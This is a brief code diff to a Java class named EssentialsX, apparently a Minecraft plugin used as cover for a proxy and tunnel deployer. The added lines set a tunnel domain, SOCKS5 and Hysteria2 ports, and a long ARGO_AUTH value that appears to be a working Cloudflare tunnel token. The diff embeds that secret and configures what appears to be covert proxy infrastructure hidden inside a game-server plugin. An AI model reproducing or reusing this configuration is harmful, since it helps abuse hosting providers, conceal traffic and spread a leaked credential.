@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "eJ9");
-        env.put("S5_PORT", "26");
-        env.put("HY2_PORT", "2");
+        env.put("ARGO_DOMAIN", "gaming4freeus.aser.cloudns.biz");
+        env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiZWI3N2QwYTEtNzc0OC00YzVhLWI1YjMtNjU4ZWQzMDEzMDQzIiwicyI6Ik5XTmxOamsxTWpNdE5UQmtNUzAwWW1KaUxUbGxNVGd0TVRnNVlqVTRNVGM1TmpKbSJ9");
+        env.put("S5_PORT", "25697");
+        env.put("HY2_PORT", "25569");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "g4fde");
+        env.put("NAME", "g4fus");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
